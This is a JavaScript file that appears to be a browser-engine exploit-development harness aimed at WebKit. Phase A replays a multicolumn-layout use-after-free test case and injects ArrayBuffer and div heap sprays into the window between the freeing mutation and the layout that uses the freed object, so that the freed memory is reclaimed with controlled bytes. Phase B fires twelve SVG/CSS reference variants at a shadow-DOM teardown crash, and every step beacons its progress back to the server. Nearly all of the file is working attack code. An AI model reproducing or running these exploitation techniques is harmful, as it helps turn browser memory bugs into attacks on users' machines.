// fa-sink-battery — attack the two fresh corpus leads
//
// PHASE A — case 154 (RenderMultiColumnFlow stale m_lastSetWorkedOn, BZ 264327):
//   The test's flow is: prepend(x28) → collapse(x49) → execCommand("insertOrderedList")
//   and the crash fires inside execCommand's synchronous layout. Between the
//   mutation (prepend invalidates the raw-pointer cache by moving the multicol
//   set) and the use (execCommand's layout), the window contains only pure JS
//   (collapse) — an ATTACKER-SIZED window. We replicate the test in an iframe
//   with an injected hook between prepend and execCommand: our spray runs
//   there. If the set was destroyed by the mutation, the spray reclaims its
//   slot and the layout dereferences our bytes (crash oracle + spray presence).
//   Variants: no spray (baseline kill), AB spray (128-1024), div-element
//   spray (same-class render objects).
//
// PHASE B — the TreeScopeOrderedMap teardown-lookup sink (cases 147 + 410):
//   The case-410 skeleton (nested shadow + slot + SVG defs referenced by CSS +
//   remove the defs host) with TWELVE different reference types — every WebCore
//   path that resolves an ID during removedFromAncestor/destructor is a
//   candidate trigger into the same mid-update map read. Each shape beacons
//   before its remove; a kill names the shape.
//     Shapes: clip-path (known killer), filter, mask, marker-end, use href,
//     textPath href, feImage href, fill url(), stroke url(), marker (start),
//     cursor?, paint-order via marker... (kept to SVG/CSS-reachable ones)
//
// Beacon prefix: VSINK-
(function() {
  var BASE = location.protocol + '//' + location.host;
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      var u = BASE + '/beacon/VSINK-' + tag + '?t=' + Date.now();
      if (body) u += '&d=' + encodeURIComponent(String(body).substring(0, 300));
      x.open('GET', u, true);
      x.send();
    } catch(e) {}
  }

  B('BOOT');

  // ── PHASE A: case 154 with a controlled window ──────────────────────────
  var TEST154_CSS =
    '<style>' +
    '*:first-of-type { position: fixed; }' +
    '*:first-child { -webkit-column-count: 1; }' +
    '*:nth-last-child(odd) { position: static;}' +
    '*:only-child { perspective: 0.56em;overflow-y: -webkit-paged-y;writing-mode: tb-rl; }' +
    '* { column-count: 6381;-webkit-border-before: ridge }' +
    '.class0 {column-span: all}' +
    '</style>';
  var TEST154_BODY =
    '<div contenteditable="true">' +
    '<li id="x23" class="class0"><br><div><div id="x28"><div id="x49"></div></div></div></li>' +
    '</div>';

  function phaseA(variant, sprayFn, next) {
    B('A-' + variant + '-START');
    var frame = document.createElement('iframe');
    frame.style.cssText = 'width:320px;height:200px';
    document.body.appendChild(frame);
    var doc = frame.contentDocument;
    doc.open();
    doc.write('<!DOCTYPE html><html><head>' + TEST154_CSS + '</head><body>' +
      TEST154_BODY +
      '<script>' +
      'window.__midMutation = null;' +
      'function main() {' +
      '  var v27 = document.defaultView.getSelection();' +
      '  var x23 = document.getElementById("x23");' +
      '  var x28 = document.getElementById("x28");' +
      '  var x49 = document.getElementById("x49");' +
      '  x23.prepend(x28);' +                       // mutation: dangles the cache
      '  if (window.parent && window.parent.__sprayHook) window.parent.__sprayHook();' +
      '  v27.collapse(x49);' +
      '  document.execCommand("insertOrderedList", false, null);' + // use: layout
      '  window.parent && window.parent.postMessage && window.parent.postMessage("A-' + variant + '-DONE", "*");' +
      '}' +
      'window.onload = main;' +
      '<\/script></body></html>');
    doc.close();
    window.__sprayHook = function() {
      B('A-' + variant + '-WINDOW');
      try { sprayFn(); } catch (e) { B('A-' + variant + '-SPRAY-X'); }
    };
    var guard = 0;
    var timer = setInterval(function() {
      guard++;
      if (guard > 20) {
        clearInterval(timer);
        B('A-' + variant + '-TIMEOUT');
        try { frame.parentNode.removeChild(frame); } catch (e) {}
        setTimeout(next, 300);
      }
    }, 500);
    var onMsg = function(e) {
      if (e.data === 'A-' + variant + '-DONE') {
        clearInterval(timer);
        window.removeEventListener('message', onMsg);
        B('A-' + variant + '-DONE');
        try { frame.parentNode.removeChild(frame); } catch (e2) {}
        setTimeout(next, 300);
      }
    };
    window.addEventListener('message', onMsg);
  }

  var AB_SIZES = [128, 192, 256, 320, 384, 448, 512, 640, 768, 1024];
  function sprayABs() {
    var keep = [];
    for (var s = 0; s < AB_SIZES.length; s++)
      for (var c = 0; c < 30; c++) keep.push(new ArrayBuffer(AB_SIZES[s]));
    window.__aKeep = keep;
  }
  function sprayDivs() {
    var keep = [];
    for (var d = 0; d < 200; d++) {
      var div = document.createElement('div');
      div.className = 'd' + (d % 8);
      keep.push(div);
    }
    window.__aKeep2 = keep;
  }

  // ── PHASE B: the TreeScopeOrderedMap teardown-lookup battery ────────────
  // Each shape: nested shadow DOM + slot + a defs element referenced by one
  // reference type + remove the defs host. Kills name the shape.
  var SHAPES = [
    { name: 'clip-path', css: 'clip-path: url(#res);' },
    { name: 'filter', css: 'filter: url(#res);' },
    { name: 'mask', css: 'mask: url(#res);' },
    { name: 'marker-end', css: 'marker-end: url(#res);' },
    { name: 'fill', css: 'fill: url(#res);' },
    { name: 'stroke', css: 'stroke: url(#res);' },
    { name: 'use', svg: '<use href="#res"/>' },
    { name: 'textPath', svg: '<text><textPath href="#res">x</textPath></text>' },
    { name: 'feImage', svg: '<filter id="res2"><feImage href="#res"/></filter>' },
    { name: 'pattern-fill', css: 'fill: url(#res);', defs: '<pattern id="res"><rect/></pattern>' },
    { name: 'gradient-fill', css: 'fill: url(#res);', defs: '<linearGradient id="res"><stop/></linearGradient>' },
    { name: 'mpath', svg: '<animateMotion><mpath href="#res"/></animateMotion>', defs: '<path id="res" d="M0,0 L10,10"/>' }
  ];

  function shapeRound(sh, i, next) {
    B('B-' + sh.name + '-' + i + '-BEFORE');
    var outer = document.createElement('div');
    document.body.appendChild(outer);
    var outerShadow = outer.attachShadow({ mode: 'open' });
    outerShadow.innerHTML =
      '<div id="inner-host">' +
      '<div id="svg-defs" slot="s"><svg><defs>' +
      (sh.defs || '<clipPath id="res"><rect width="50" height="50"/></clipPath>') +
      '</defs></svg></div>' +
      '<div id="svg-user" slot="s"><svg>' +
      (sh.svg || ('<rect width="100" height="100" style="' + sh.css + '"/>')) +
      '</svg></div></div>';
    var innerHost = outerShadow.getElementById('inner-host');
    var innerShadow = innerHost.attachShadow({ mode: 'open' });
    innerShadow.innerHTML = '<slot name="s"></slot>';
    document.body.offsetHeight; // force layout, register references
    B('B-' + sh.name + '-' + i + '-REMOVE');
    try {
      outerShadow.getElementById('svg-defs').remove(); // the kill
      B('B-' + sh.name + '-' + i + '-SURVIVED');
    } catch (e) {
      B('B-' + sh.name + '-' + i + '-X', String(e).substring(0, 60));
    }
    try { outer.remove(); } catch (e) {}
    setTimeout(next, 250);
  }

  // ── plan ────────────────────────────────────────────────────────────────
  var plan = [];
  plan.push(function(next) { phaseA('baseline', function() {}, next); });
  plan.push(function(next) { phaseA('abspray', sprayABs, next); });
  plan.push(function(next) { phaseA('divspray', sprayDivs, next); });
  for (var si = 0; si < SHAPES.length; si++) {
    (function(sh) {
      for (var it = 0; it < 3; it++) {
        (function(iter) {
          plan.push(function(next) { shapeRound(sh, iter, next); });
        })(it);
      }
    })(SHAPES[si]);
  }

  B('PLAN', 'steps=' + plan.length);
  function run() {
    var step = plan.shift();
    if (!step) { B('DONE-ALL-SURVIVED'); return; }
    step(run);
  }
  setTimeout(run, 200);
})();
